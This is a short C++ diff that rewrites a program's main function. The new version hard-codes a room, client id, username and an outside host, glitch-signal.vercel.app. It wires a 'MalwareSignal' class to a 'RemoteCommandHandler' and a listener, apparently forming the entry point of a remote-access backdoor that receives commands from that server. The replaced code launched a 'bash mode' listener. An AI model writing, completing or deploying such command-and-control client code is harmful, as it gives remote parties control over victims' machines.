@@ -1,15 +1,27 @@
-#include "controller/controller.hpp"
-
 #include <iostream>
-#include <string>
+#include <memory>
+#include <random>
+#include "include/controller/Listener.h"
+#include "include/model/MalwareSignal.h"
+#include "include/model/RemoteCommandHandler.h"
 
-int main(int argc, char* argv[]) {
-    if (argc != 5) {
-        std::cerr << "Usage: " << argv[0]
-                  << " <room> <client-id> <host> <username>\n";
-        return 1;
-    }
+using namespace std;
 
-    listenBashMode(argv[1], argv[2], argv[3], argv[4]);
+
+int main() {
+    const string room = "ROOM";
+    const string clientId = "1234";
+    const string host = "https://glitch-signal.vercel.app/";
+    const string username = "USERNAME";
+
+    auto signal = make_shared<MalwareSignal>(room, clientId, host, username);
+
+    // Registers the message handler before connecting/listening.
+    auto handler = make_shared<RemoteCommandHandler>(signal);
+
+    Listener mode(signal, handler);
+
+    mode.run();
+
     return 0;
 }
